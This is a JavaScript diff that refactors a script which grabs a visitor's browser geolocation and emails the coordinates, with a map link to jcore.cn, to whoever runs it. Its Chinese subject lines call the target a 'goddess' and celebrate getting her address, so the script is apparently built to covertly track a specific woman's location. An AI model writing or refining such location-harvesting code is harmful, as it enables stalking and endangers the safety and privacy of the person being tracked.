@@ -16,15 +16,12 @@
         {
             var self = this;
             this.repeat = true;
-            console.log(this.repeat);
-            if(this.repeat){ //防止重复点击
-               this.gps(function(mail){
-                   if(mail.isSuccess){
-                       self.sendMail({ subject : mail.subject, html : mail.html });
-                       this.repeat = false;
-                   }else{
-                       this.repeat = false;
-                   }
+            if(this.repeat) //防止重复点击
+            {
+               this.gps(function(mail)
+               {
+                    self.sendMail({ subject : mail.subject, html : mail.html });
+                    this.repeat = false;
                });
             }
         },
@@ -37,7 +34,7 @@
                 navigator.geolocation.getCurrentPosition(function (position)
                 {
                     var lon = position.coords.longitude; //经度
-                    var lat = position.coords.latitude; //纬度
+                    var lat = position.coords.latitude;  //纬度
 
                     if(position.address) //是否支持address属性
                     {
@@ -47,7 +44,7 @@
                     }
                     message = ( "lat=" + lat + "&lon=" + lon );
                     callfun({
-                        isSuccess : true,
+                        tip : true,
                         subject : "女神地址获取成功，速速查看^0^...",
                         html : "<a href=\"http://jcore.cn/getaddress.html?"+message+"\" target=\"_blank\" >戳我..."+ address +"</a>"
                     });
@@ -64,7 +61,7 @@
                     alert(tip[0]);
                     message = ('获取数据失败：' + tip[1]);
                     callfun({  //失败也发送错误提醒
-                        isSuccess : true,
+                        tip : true,
                         subject : "女神地址获取失败，不哭不哭T_T...",
                         html : message
                     });
